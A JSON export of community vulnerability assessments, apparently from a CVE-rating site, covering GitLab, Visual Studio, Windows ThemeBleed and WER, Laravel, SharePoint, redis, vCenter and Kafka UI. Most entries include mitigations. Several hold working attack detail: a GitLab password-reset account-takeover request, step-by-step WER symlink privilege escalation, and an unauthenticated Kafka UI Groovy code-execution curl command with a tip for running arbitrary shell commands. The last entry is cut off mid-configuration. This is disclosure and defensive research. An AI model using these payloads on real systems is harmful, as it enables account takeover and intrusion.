          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "e4f7a426-1beb-45a4-ac47-b2f56237be20",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "cdb345a4-b070-4953-b827-f362fd3e1354",
      "created": "2024-01-12T10:51:39.209238Z",
      "revisionDate": "2024-01-15T08:47:39.369571Z",
      "document": "Tested on Gitlab CE 16.6.1. Very effective and easy to exploit. In the following payload the brackets MUST be URL encoded, else it won't work: `user[email][]=victim@example.org&user[email][]=attacker@example.org`.\r\n\r\n```http\r\nPOST /users/password HTTP/2\r\nHost: gitlab.example.org\r\n...\r\n\r\nauthenticity_token=<auto_generated_token>&user%5Bemail%5D%5B%5D=victim%40example.org&user%5Bemail%5D%5B%5D=attacker%40example.org\r\n```\r\n\r\nNote that you must know the email address and not the login name.\r\n\r\nSee [here](https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/#account-takeover-via-password-reset-without-user-interactions) for vulnerable and patched versions.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a0b65cce-4750-4947-9ff2-2a53f853b2a4",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "aa26d360-730d-4210-ab80-2b652cc4bd60",
      "created": "2024-01-15T14:20:20.735705Z",
      "revisionDate": "2024-01-15T14:20:20.734796Z",
      "document": "CVE-2024-20656 is an elevation of privilege vulnerability in Microsoft Visual Studio, specifically in the Diagnostics Hub Standard Collector. This vulnerability, if exploited, allows an attacker to gain SYSTEM privileges on affected systems. Vulnerabilities like these are often observed being used in ransomware attacks.\r\n\r\nThis vulnerability concerns an issue with the VSStandardCollectorService150 service, which is used for diagnostic purposes in Visual Studio and runs in the NT AUTHORITY\\SYSTEM context. The flaw was discovered by security researcher Filip Dragovi\u0107, who also released a proof-of-concept (PoC) exploit code.\r\n\r\nThe exploit starts with the creation of a dummy directory where the VSStandardCollectorService150 writes files. The attacker then uses a series of manipulations involving junction directories and symbolic links, culminating in replacing a critical binary with a commandeered version to gain a SYSTEM shell.\r\n\r\nTo mitigate this issue, Microsoft released a patch as part of their Patch Tuesday updates. Users of Visual Studio are advised to apply the security update to prevent exploitation of this vulnerability. The update applies to all Visual Studio 2015 Update 3 editions except Build Tools.\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4f61b101-be1f-453a-9127-efc203315d47",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "e316a72f-7716-4006-bb1d-804aea1002e6",
      "created": "2024-01-17T00:47:53.674224Z",
      "revisionDate": "2024-01-22T13:58:27.134504Z",
      "document": "CVE-2023-38146, A.K.A. `Themebleed` was discovered by [Gabe Kirkpatrick](https://github.com/gabe-k) and is a time-of-check-to-time-of-use dll hijacking vulnerability with a slight twist.  Windows 11 Versions 21H2 and 22H2 are vulnerable.\r\n\r\nThe vulnerability works because under a specific set of circumstances, opening a theme file will cause a dll that is improperly checked to be loaded and run in the context of the user who opened the theme file.\r\n\r\n## Background\r\nWindows `.theme` files are simple text files that reference Windows `.msstyles` files.  `.msstyles` files are just fancy `.dll` files that contain resources for the theme like icons.  While `.msstyles` files are PE files and follow the `.dll` format, they should not contain executable code.\r\n\r\n## Vulnerability\r\nIf a `.theme` file references an `.msstyles`  file with a `PACKME_VERSION` of 999, a special code branch of code is taken during the loading process and a it causes the process to attempt a call to a function contained in an accompanying `.dll` file.  That second dll will have the same path and name as the `.msstyles` file, but will be appended with `_vrt.dll.`  To be safe, that new dll is checked to ensure that it is a signed Microsoft `.dll` before it is loaded and the exported function is called.\r\n\r\nThe vulnerability lies in the improper verification of that `.dll` file.  The verification and loading are two atomic actions: first the file is opened for reading and verified, then the file is opened for execution and loaded.  If a malicious actor can separate the file open action for verification and file open action for execution, they can make it so that a legitimate `.dll` is used for verification and then a malicious `.dll` for execution.  \r\n\r\nOne way that an attacker can control the files is by using a UNC path in the `.theme` file that points to an `.msstyles` file on an SMB server that the attacker controls.  If the hosted `.msstyles` file has a `PACKME_VERSION` value of 999, then the theme loader will attempt to call a function contained in a `.dll` file on the same share.  An SMB server must know the requested file actions to enforce permissions, so the action desired by the client is contained within the request to the SMB server.  This allows the attacker to serve a legitimate, signed `.dll` when it receives a read request for the file, but a malicious `.dll` when it receives a request to open the same file for execution.\r\n\r\nFurther, the person who discovered the vulnerability also found that by converting the theme file into a cab file and naming it with the `.themepack` extension, the file will no longer appear as a downloaded file, and the user will not be prompted with a warning when they open it.\r\n\r\n## Mitigation\r\nMicrosoft patched this vulnerability by removing support for `PACKME_VERSION` 999.  It is recommended that you patch, but because this is a very precise vulnerability with many parts, several options exist for mitigation in addition to patching.  At a host filesystem level, mitigation for this exploit would be to alert and stop any open file request to files that end in `_vrt.dll` or at a network level, stop and alert on any SMB connections that request files ending in `_vrt.dll`.  It is also likely safe for many environments to prevent any SMB requests outside the enterprise entirely, or even better, limit SMB connections to specific resources within the enterprise.\r\n",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6299bb2e-ccce-4e7b-863f-0788d8a138d8",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "b9816cf3-ac8b-49a8-b1b9-895bb26a15d7",
      "created": "2024-01-17T10:10:43.898145Z",
      "revisionDate": "2024-01-17T10:10:43.898074Z",
      "document": "CVE-2018-15133 is a vulnerability in the Laravel Framework versions 5.5.40 and 5.6.x up to 5.6.29. It allows remote code execution as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. An attacker must know the application key to exploit this vulnerability, which would normally be unlikely but could occur if they had previously gained privileged access or successfully accomplished a prior attack\u200b\u200b\u200b\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "ce69360d-3c58-465a-b630-302d99e8baa9",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "07cdb5f7-80a0-4f46-a0c5-6b77bf62d7ac",
      "created": "2024-01-17T10:31:15.567716Z",
      "revisionDate": "2024-01-17T10:31:15.567013Z",
      "document": "CVE-2023-29357 is a critical vulnerability in Microsoft SharePoint Server, classified as an Elevation of Privilege (EoP) flaw. . This vulnerability allows attackers to use spoofed JSON web tokens (JWTs) to gain Administrator privileges on the SharePoint host. The exploit does not require the attacker to have any privileges or for the user to perform any action\u200b\u200b\u200b\r\n\r\nThe vulnerability was identified by Nguy\u1ec5n Ti\u1ebfn Giang (Jang) of StarLabs SG and demonstrated at ZDI\u2019s Pwn2Own hacking contest in March 2023. In September 2023, a technical writeup of the flaw and its use in a two-bug exploit chain to achieve pre-authentication remote code execution (RCE) on the SharePoint server was published, along with proof-of-concept (PoC) code demonstrating the attack\u200b. Write-up link: https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/\r\n\r\n\u200b\u200b\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "54d2e5af-4cf7-40de-8aac-0afe7a59972e",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "a9c79bad-76f2-49a8-9c62-d94818ecd2f2",
      "created": "2024-01-17T16:54:11.847587Z",
      "revisionDate": "2024-01-17T16:54:11.847736Z",
      "document": "CVE-2023-36874 is a filesystem redirection vulnerability that relies on a trusted process using relative filepath data and poor file validation to allow a malicious actor to escalate privilege on Windows 10 hosts. \r\n\r\n## How it is supposed to work\r\nThe Windows Error Reporting Service (WER) is a privileged (SYSTEM) process that handles errors on Windows systems.  It is not meant for user interaction, so many of the ways to interact with it are undocumented COM interfaces.\r\nThrough a non-trivial set of calls to COM objects, a user can create an `IWerReport` COM object.  Once the user has that object, they can make a call to submit a report file associated with that object.  The file must be located in `%PROGRAMDATA%\\Microsoft\\Windows\\WER\\ReportArchive\\<reportdir>\\`.\r\nAs part of the report submission process, the `WER` service calls `CreateProcess` and passes it the executable responsible for handling the `WER` report, `%WINDIR%\\system32\\wermgr.exe`.  This results in the `wermgr.exe` process launching as `SYSTEM` and handling the reporting.\r\n\r\n## The Vulnerability\r\nThere are two  issues at play fort his vulnerability: one is that rather than using the absolute filepath to the `wermgr.exe` file as above, the `CreateProcess` function is handed a relative filepath to the `wermgr.exe` executable based on the location of the error report, so the `WER` service launches `..\\..\\..\\..\\..\\..\\system32\\wermgr.exe` with the origination directory as the directory containing the `WER` report to submit, and the second is that neither file is checked for a symbolic link before it is opened.\r\nThat means that a user can:\r\n1) Create a `WER`  report in `C:\\arbitrary_dir\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\Report\\<report_dir>\\Report.wer`\r\n2)  Place any executable in `C:\\arbitrary_dir\\system32\\` named `wermgr.exe`\r\n3) Create a symbolic link between `C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\<reportdir>\\` and  `C:\\arbitrary_dir\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\Report\\<report_dir>\\`\r\n4) Create the `IWerReport` COM object\r\n5) Submit the COM object paired with the report in `C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\<reportdir>\\`\r\nThis results in `..\\..\\..\\..\\..\\..\\system32\\wermgr.exe` being opened as system, and as the symlink created a redirect, it will launch whatever executable we have stored as `C:\\arbitrary_dir\\system32\\wermgr.exe`\r\n\r\n## Mitigation\r\nMicrosoft released a patch for this vulnerability, so the first suggestion is to patch.  Alternatively and additionally, because this vulnerability requires an executable file named `wermgr.exe` and a report named `Report.wer`, a host-based protection might be simply to ensure that any file named wermgr.exe` outside the legitimate `%WINDIR%\\system32` directory flagged and quarantined.  The same tactic could be applied to the `Report.wer` files outside the proper structure.  Another option might be to prevent symbolic link calls with `system32` as a directory destination.\r\n\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "58a96fbf-a409-41e8-87a2-21ae6ddecadf",
      "editorId": "c77d24bb-d8c6-4151-8b0a-cf7441a15ce3",
      "topicId": "a2ad51aa-0fa4-4215-84f0-3a93c48583a2",
      "created": "2024-01-17T17:28:11.096312Z",
      "revisionDate": "2024-01-17T17:28:31.647363Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": []
    },
    {
      "id": "d14fe2c9-4823-4246-8be3-adb88742cc58",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "e1d0d231-4f1e-4a16-a091-e0b0b654939e",
      "created": "2024-01-18T23:02:56.982025Z",
      "revisionDate": "2024-01-19T14:00:03.423333Z",
      "document": "The redis project patched a possible memory corruption vulnerability in the `sdsResize` method using commit [5f5f298a](https://github.com/redis/redis/commit/5f5f298a4a071abf8f1d3b066c39d050ee1a03a7). The changes addressed an edge case whereby the method may not set the simple dynamic string (SDS) type field. SDS values use a variable-sized header based on their type. The types are defined as one of `HI_SDS_TYPE_5`, `HI_SDS_TYPE_8`, `HI_SDS_TYPE_16`, `HI_SDS_TYPE_32`, or `HI_SDS_TYPE_64` where the number defines the bit width of the length and size fields. `HI_SDS_TYPE_5` is a special case where the length is encoded in the 5 most significant bits of the flags field (whose 3 least significant bits are the type), and there is no dedicated length or size field.\r\n\r\nThese types are defined in [deps/hiredis/sds.h](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/deps/hiredis/sds.h#L53) and the format is:\r\n\r\n```\r\nhisdshdr5                  FBBBB...\r\nhisdshdr8                LAFBBBB...\r\nhisdshdr16             LLAAFBBBB...\r\nhisdshdr32         LLLLAAAAFBBBB...\r\nhisdshdr64 LLLLLLLLAAAAAAAAFBBBB...\r\n           ^       ^       ^^\r\n           |       |       |\\ (char *)sds points here\r\n           |       |       \\ 1 - byte of flags where the 3 LSBs are the type and the 5 MSBs are the size in hisdshdr5 or unused\r\n           |       \\ N-bits of allocation size (number of bytes available for the buffer)\r\n           \\ N-bits of length (number of bytes used by the buffer)\r\n```\r\n\r\nThe changes to `sdsResize` ensure that when `realloc` is not used to perform the resizing operation, that the type field is always set before the calls to [`sdssetlen`](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/sds.c#L374) and [`sdssetalloc`](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/sds.c#L375). The unpatched implementation of `sdsResize` would simply set the SDS length and size with the allocations were already considered to be [\u201coptimal\u201d](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/sds.c#L358). If the allocation was already optimal and did not require a reallocation to adjust the size, but the SDS type itself needed to be increased to store the new value, the size field may overflow in such a way that the SDS size is marked as smaller than it is. \r\n\r\nThis condition would require:\r\n\r\n1. Redis be built with the `USE_JEMALLOC` macro, without this compile-time setting `alloc_already_optimal` will never be truish\r\n2. That `sdsResize` be called to enlarge the SDS value\r\n3. That the allocation size occupied by the SDS value be the same as the new size that it is being enlarged to\r\n4. The original size be of a smaller SDS type than the new size (i.e. the new size requires more bits to store than are available within the original).\r\n\r\nA quick spot check reveals that the `redis` package provided by Fedora 39 is built with the `USE_JEMALLOC` macro defined and meets the first condition. For the second condition, locations where `sdsResize` is invoked need to be identified. This search yields the following 4 locations:\r\n\r\n- [`sdsRemoveFreeSpace`](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/sds.c#L311) \u2014 This location will only reduce the size of the allocation\r\n- [`sdsTest`](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/sds.c#L1247) \u2014 These locations are only used as part of testing. Also the sizes are static.\r\n- [`clientsCronResizeQueryBuffer`](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/server.c#L751) \u2014 This location will only reduce the size of the allocation. It\u2019s intended to run periodically to reclaim unused memory that was once occupied by the query buffer. It can not be used to enlarge the SDS value. The resize value could be set to `c->bulklen`, which is attacker-controllable by using [bulk loading](https://redis.io/docs/manual/patterns/bulk-loading/), however, it will not be larger than the existing allocation.\r\n- [`hllSparseSet`](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/hyperloglog.c#L655)\r\n\r\n## hllSparseSet\r\n\r\nThis function uses `sdsResize` to increase the size of the `sds` struct.\r\n\r\nThis will call `sdsResize` as the `PFADD` command is received. The size will increment by three each time it is called. `sdsResize` is only called when there are fewer than 3 bytes available in the `sds` structure. When enlarging the `sds` structure, `o->ptr` is increased to either double its current value or 300, whichever is smaller. The `sds` structure is resized in this way until it has reached `server.hll_sparse_max_bytes` which is 3,000 by default. This means that it can only be resized at most 13 times. Of those 13 times the value is enlarged, it only changes SDS type twice, once from 5 to 8 the first time it is resized and then from 8 to 16 the 4th time it is resized. In neither of these cases is the existing allocation the same size as the requested one, most likely because of how the buffer is doubling in size at this point. Because the existing allocation size is not the same as the requested one, the `alloc_already_optimal` value is false in `sdsResize` and the [branch is taken]([https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/sds.c#L3](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/sds.c#L371)65) which [sets the type](https://github.com/redis/redis/blob/7f4bae817614988c43c3024402d16edcbf3b3277/src/sds.c#L371) correctly.\r\n\r\nThe hllSparseSet code path can be triggered with the following Python code for debugging:\r\n\r\n```\r\nimport redis\r\nimport time\r\n\r\nr = redis.Redis(host='localhost', port=6379, decode_responses=True)\r\n\r\nstart = int(time.time())\r\nfor i in range(0x1000):\r\n\tr.pfadd('pf-' + str(start), str(i))\r\n\r\nr.close()\r\n```\r\n\r\n# Conclusion\r\nBased on this analysis there is no demonstratable threat to the redis project posed by this bug. The necessary conditions to enlarge an SDS value in the way necessary to trigger the overflow are not reacable by any code path included in the most recent vulnerable version 7.2.3. Nevertheless, this bug should be and has been patched to prevent it\u2019s use in the future. An ideal scenario where this bug could be leveraged would require the attacker to have a high degree of control over both the currently allocated size of the SDS and the new size. In that case, starting with an SDS of 0xff bytes and resizing it to 0x100 would use the affected code path and incorrectly set the length and size to 0.",
      "score": 2,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "5707cf70-b245-462a-b40d-4fc16e653817",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "1fd653ca-2ad2-4b6e-b8ac-6aa757fe6b9b",
      "created": "2024-01-19T10:39:53.195349Z",
      "revisionDate": "2024-01-28T19:41:26.571319Z",
      "document": "Critical out-of-bounds write vuln in vCenter Server and Cloud Foundation. While we haven't looked at this in-depth, [VMware's advisory](https://www.vmware.com/security/advisories/VMSA-2023-0023.html) indicates that it's been exploited in the wild, and they took the unusual step of patching several end-of-life versions of vCenter Server: \r\n\r\n> While VMware does not mention end-of-life products in VMware Security Advisories, due to the critical severity of this vulnerability and lack of workaround VMware has made a patch generally available for vCenter Server 6.7U3, 6.5U3, and VCF 3.x. For the same reasons, VMware has made additional patches available for vCenter Server 8.0U1.\r\n\r\nThe vuln requires network access to exploit, for whatever that's worth at this point in threat-land. Typical skepticism on ease/reliability of exploitation applies given that this is a memory corruption vuln, but with that said, vCenter is a high-value target for skilled and motivated threat actors, including ransomware groups. vCenter Server customers should heed the [FAQ advice](https://core.vmware.com/resource/vmsa-2023-0023-questions-answers) and patch on an emergency basis. \r\n\r\n**Edit:** Mandiant has [published technical information](https://www.mandiant.com/resources/blog/chinese-vmware-exploitation-since-2021) revealing that this vuln has apparently been exploited since 2021 by UNC3886, a China-nexus threat actor. So it is 0day after all. ",
      "score": 1,
      "metadata": {
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "dd3eeaea-d0af-4baa-a093-51ccbbf54678",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "a2b77e3d-0f1b-4f9f-a8a7-1afaf4e18627",
      "created": "2024-01-20T10:43:56.49348Z",
      "revisionDate": "2024-02-04T16:01:55.607093Z",
      "document": "[Kafka UI]( https://github.com/provectus/kafka-ui) is a nice web front-end that provides a fast and lightweight web UI for managing Apache Kafka\u00ae clusters developed by provectus.\r\nUnfortunately there is a Remote Code Execution vulnerability at the latest version `0.7.1` that was discovered and disclosed on Sep 27, 2023 to provectus, but not yet patched.\r\nThe vulnerability can be exploited via the `q` parameter at `/api/clusters/local/topics/{topic}/messages` endpoint which allows the use to define a `Groovy` script filter. There is no sanitation of the groovy script filter before it is executed. This allows an attacker to execute arbitrary code on the server.\r\n\r\nThe vulnerable code can be found in the function [groovyScriptFilter](https://github.com/provectus/kafka-ui/blob/master/kafka-ui-api/src/main/java/com/provectus/kafka/ui/emitter/MessageFilters.java#L41>):\r\n```groovy\r\n  static Predicate<TopicMessageDTO> groovyScriptFilter(String script) {\r\n    var engine = getGroovyEngine();\r\n    var compiledScript = compileScript(engine, script);\r\n    var jsonSlurper = new JsonSlurper();\r\n    return new Predicate<TopicMessageDTO>() {\r\n      @SneakyThrows\r\n      @Override\r\n      public boolean test(TopicMessageDTO msg) {\r\n        var bindings = engine.createBindings();\r\n        bindings.put(\"partition\", msg.getPartition());\r\n        bindings.put(\"offset\", msg.getOffset());\r\n        bindings.put(\"timestampMs\", msg.getTimestamp().toInstant().toEpochMilli());\r\n        bindings.put(\"keyAsText\", msg.getKey());\r\n        bindings.put(\"valueAsText\", msg.getContent());\r\n        bindings.put(\"headers\", msg.getHeaders());\r\n        bindings.put(\"key\", parseToJsonOrReturnAsIs(jsonSlurper, msg.getKey()));\r\n        bindings.put(\"value\", parseToJsonOrReturnAsIs(jsonSlurper, msg.getContent()));\r\n\r\n        var result = compiledScript.eval(bindings);  <==== vulnerable code\r\n        \r\n        if (result instanceof Boolean) {\r\n          return (Boolean) result;\r\n        } else {\r\n          throw new ValidationException(\r\n              \"Unexpected script result: %s, Boolean should be returned instead\".formatted(result));\r\n        }\r\n      }\r\n    };\r\n  }\r\n```\r\nThe exploit is pretty simple to execute by the request below:\r\nWe are using a Groovy OS execution code snippet `\"touch /tmp/cuckoo\".execute();` to test the vulnerability.\r\nYou need an active Kafka cluster, in this case our cluster is named `local` and a topic (`cuckoo`) which you can create if there are no topics.\r\n```shell\r\ncurl 'http://192.168.201.25:8080/api/clusters/local/topics/cuckoo/messages?q=%22touch%20%2Ftmp%2Fcuckoo%22.execute()&filterQueryType=GROOVY_SCRIPT&attempt=4&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING'\r\n```\r\n```shell\r\n/tmp $ ls -l\r\ntotal 4\r\n-rw-r--r--    1 kafkaui  kafkaui          0 Jan 24 16:26 cuckoo\r\ndrwxr-xr-x    2 kafkaui  kafkaui       4096 Jan 24 16:25 hsperfdata_kafkaui\r\n/tmp $ \r\n```\r\nPretty simple, right? \r\nAnd without any authentication!!!\r\n\r\nIf you want to make a more complex system command,  you should not use `\"my commandline\".execute()` because it can not handle unix pipe `|`, redirection `>` and command chaining with `;`.\r\nYou better use some Groovy scripting along the lines like below:\r\n `\"Process p=new ProcessBuilder(\\\"sh\\\",\\\"-c\\\",\\\"<my complex cmd_line>\\\").redirectErrorStream(true).start()\"`\r\n\r\nIf you want to play around with this vulnerability, just follow the steps below to install a vulnerable Kafka-ui instance with an active Kafka cluster.\r\n\r\n### Installation steps to install Kafka ui\r\n* Install `Docker` on your preferred platform. \r\n*  Here are the installation instructions for [Docker Desktop on MacOS](https://docs.docker.com/desktop/install/mac-install/).\r\n* Create a empty directory (`kafka-ui`).\r\n* Create the following `docker-compose.yaml` file in the directory. This will automatically create a Kafka cluster with Kafka-ui. You can modify the `v0.7.0` in the `yaml` file to pull different versions.\r\n```\r\nversion: '2'\r\n\r\nnetworks:\r\n  rmoff_kafka:\r\n    name: rmoff_kafka\r\n\r\nservices:\r\n  zookeeper:\r\n    image: confluentinc/cp-zookeeper:latest\r\n    container_name: zookeeper\r\n    networks:\r\n      - rmoff_kafka\r\n    environment:\r\n      ZOOKEEPER_CLIENT_PORT: 2181\r\n      ZOOKEEPER_TICK_TIME: 2000\r\n    ports:\r\n      - 22181:2181\r\n\r\n  kafka:\r\n    image: confluentinc/cp-kafka:latest\r\n    container_name: kafka\r\n    networks:\r\n      - rmoff_kafka\r\n    depends_on:\r\n      - zookeeper\r\n    ports:\r\n      - 29092:9092\r\n    environment:\r\n      KAFKA_BROKER_ID: 1\r\n      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181\r\n      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092,PLAINTEXT_HOST://localhost:29092\r\n      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,PLAINTEXT_HOST:PLAINTEXT\r\n      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT\r\n      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1\r\n\r\n  kafka-ui:\r\n    container_name: kafka-ui\r\n    image: provectuslabs/kafka-ui:v0.7.0\r\n    networks:\r\n      - rmoff_kafka\r\n    ports:\r\n      - 8080:8080\r\n    depends_on:\r\n      